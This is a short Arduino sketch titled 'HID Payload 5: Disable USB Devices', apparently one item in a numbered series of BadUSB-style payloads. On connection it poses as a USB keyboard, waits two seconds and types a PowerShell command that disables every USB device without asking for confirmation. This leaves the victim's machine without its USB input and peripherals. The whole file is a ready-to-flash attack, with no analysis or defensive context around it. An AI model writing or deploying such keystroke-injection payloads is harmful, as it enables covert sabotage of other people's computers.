// HID Payload 5: Disable USB Devices
#include "Arduino.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(2000);
    Keyboard.println("powershell Get-PnpDevice | Where-Object { $_.InstanceId -like '*USB*' } | Disable-PnpDevice -Confirm:$false");
}

void loop() {}